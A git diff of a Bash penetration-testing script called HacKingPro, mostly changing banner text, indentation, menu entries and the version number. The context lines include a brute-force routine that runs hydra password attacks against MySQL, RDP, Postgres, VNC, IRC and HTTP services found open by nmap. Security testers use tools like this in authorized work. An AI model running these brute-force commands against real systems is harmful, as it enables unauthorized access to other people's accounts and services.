@@ -29,14 +29,14 @@ about() {
     ${ToolHeader}
 
     ${DGrey}┏──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}is a Penetration Testing Tool ❕❕❕ ${BRed}]
-    ${DGrey}┣──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Written by ${BCyan}Leon Yaakobov ${BRed}]
-    ${DGrey}┗──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}For Showing my Skills ${BRed}]
+    ${DGrey}┣──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Written by ${BCyan}Leon Yaakobov ${Color_Off}For Showing Skills ${BRed}]
+    ${DGrey}┗──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Tool for ${BRed}Red Teams ${BBlue} Blue Teams ${BRed}]
 
-    ${DGrey}┌==⥤ ${Color_Off}[${LRed} ❌ ❗ Warning ❗ ❌ ${Color_Off}]
+    ${DGrey}┏==⥤ ${Color_Off}[${LRed} ❌ ❗ Warning ❗ ❌ ${Color_Off}]
     ${DGrey}|
-    ${DGrey}╠==⥤ ${Color_Off}[${LRed} I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
+    ${DGrey}┣==⥤ ${Color_Off}[${LRed} I’m not responsible for any misuse or damage caused by this program.❗ ${Color_Off}]
     ${DGrey}|
-    ${DGrey}╚==⥤ ${Color_Off}[${LRed} Use this tool at your own ${BRed}Risk! ❗❗${Color_Off}] "
+    ${DGrey}┗==⥤ ${Color_Off}[${LRed} Use this tool at your own ${BRed}Risk! ❗❗${Color_Off}] "
 
    read -p "$Press_ENTER"
 }
@@ -737,7 +737,7 @@ while true; do
   done
 }
 
-BruteForce() {
+BruteForce(){
 
   # Creating Scans and Output Folders
   Report() {
@@ -871,7 +871,7 @@ BruteForce() {
       echo "${AfterBruteSMTP}"
     fi
  }
- BruteSMTP
+  BruteSMTP
 
 
  BruteHTTP(){
@@ -1017,84 +1017,84 @@ BruteForce() {
 		hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
 		hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
     Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 3389/tcp nmap.log; then
+   if grep -q 3389/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3389(RDP) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
 		hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 5432/tcp nmap.log; then
+   if grep -q 5432/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 5900/tcp nmap.log; then
+   if grep -q 5900/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5900(VNC) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
 		hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 5901/tcp nmap.log; then
+   if grep -q 5901/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
 		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 6667/tcp nmap.log; then
+   if grep -q 6667/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 8000/tcp nmap.log; then
+   if grep -q 8000/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 8080/tcp nmap.log; then
+   if grep -q 8080/tcp nmap.log; then
     echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
 		hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
-  fi
+   fi
 
-  if grep -q 8100/tcp nmap.log; then
+   if grep -q 8100/tcp nmap.log; then
     echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
 		sleep 1
     hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
 		Finished_Brute ${targetIP}
-  else
+   else
     echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
-  fi
+   fi
 
   read -p "$Press_ENTER"
 
@@ -1336,7 +1336,8 @@ AttacKing(){
 fi
 }
 
-###############################################
+
+###################### HacKingPro Planning ##########################
 
 # Read Target Name From the User
 ReadTargetNameFromtheUser(){
@@ -1355,7 +1356,7 @@ ReadTargetNameFromtheUser(){
 }
 
 # Define Variables For Case Directory
-TryHackMeCase="${MainDirectoriy}/Case"
+MainDirectoriyCase="${MainDirectoriy}/Case"
 
 # Read Target Name From the User
 ReadTargetNameFromtheUser(){
@@ -1471,7 +1472,7 @@ HacKingProPlanning(){
   echo "          ${BYellow} Log Directory ${BRed}[${BGreen} $(pwd) ${BRed}]\n${BGreen}"
   echo "          ${BYellow} Log File ${BRed}[${BGreen} $(ls) ${BRed}]\n${BGreen}"
   read -p "$Press_ENTER"
-  cd "$TryHackMeCase"
+  cd "$MainDirectoriyCase"
   cd "$targetNAME"
 
 }
@@ -1528,7 +1529,8 @@ FunTargetPhone(){
       fi
     }
 
-###############################################
+###################### HacKingPro Planning ##########################
+
 
 
 # Checking if Case Folder Exist
@@ -1710,7 +1712,7 @@ FullTime=$(date)
 # HacKingPro Design
 HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
 Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
-MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}14")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}15")
 HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
@@ -1952,6 +1954,7 @@ AlternativeMenu(){
 # HacKingPro Main Menu
 MainMenu(){
   while true; do
+    cd "$XHacKingPro"
   #statements
   clear
   # HacKingProLogo1
@@ -1976,6 +1979,8 @@ MainMenu(){
 
     HacKingProMenuMain=$(echo "${BRed}"
     # ${DGrey}|──${BRed}[${BYellow} KoTH ${BRed}]${BGreen}── ${BBlack}[${BBlack} 🤴🏼 King of The Hill ⛰ ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 03 ${BRed}]${BGreen}── ${BRed}[${BBlack} Web Application HacKing 🕸 ${BRed}]
+    # ${DGrey}|──${BRed}[${BBlack} 04 ${BRed}]${BGreen}── ${BRed}[${BBlack} Database Assessment ${BRed}]
     # ${DGrey}|──${BRed}[${BBlack} 06 ${BRed}]${BGreen}── ${BRed}[${BBlack} Wireless HacKing 📡 ${BRed}]
     # ${DGrey}|──${BRed}[${BBlack} 07 ${BRed}]${BGreen}── ${BRed}[${BBlack} Reverse Engineering ${BRed}]
     # ${DGrey}|──${BRed}[${BBlack} 08 ${BRed}]${BGreen}── ${BRed}[${BBlack} Exploit Frameworks & DataBases ${BRed}]
@@ -1993,8 +1998,6 @@ MainMenu(){
     ${DGrey}|──${BRed}[${DGrey} 00 ${BRed}]${BGreen}── ${BRed}[${DGrey} Anonymity ${BRed}]
     ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} Information Gathering ${BRed}]
     ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}── ${BRed}[${DGrey} Reconnaissance & Vulnerability Assessment ${BRed}]
-    ${DGrey}|──${BRed}[${BBlack} 03 ${BRed}]${BGreen}── ${BRed}[${BBlack} Web Application HacKing 🕸 ${BRed}]
-    ${DGrey}|──${BRed}[${BBlack} 04 ${BRed}]${BGreen}── ${BRed}[${BBlack} Database Assessment ${BRed}]
     ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}── ${BRed}[${DGrey} Password HacKing ${BRed}]
     ${DGrey}|
     ${DGrey}|──${BRed}[${DGrey} AnyTool ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Many Systems HacKing Tools ${HacKingPro} ${BRed}]
@@ -2003,6 +2006,7 @@ MainMenu(){
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
+
     ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
@@ -2010,6 +2014,12 @@ MainMenu(){
     ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
     read -p "$HacKingProMenuMain" cmd
     case $cmd in
+      any|Any )
+      cd Menu
+      cd AnyTool
+      sh AnyTool
+      cd "$MainDirectoriy"
+      ;;
       ht|hacktricks|HackTricks )
       HackTricks
       ;;
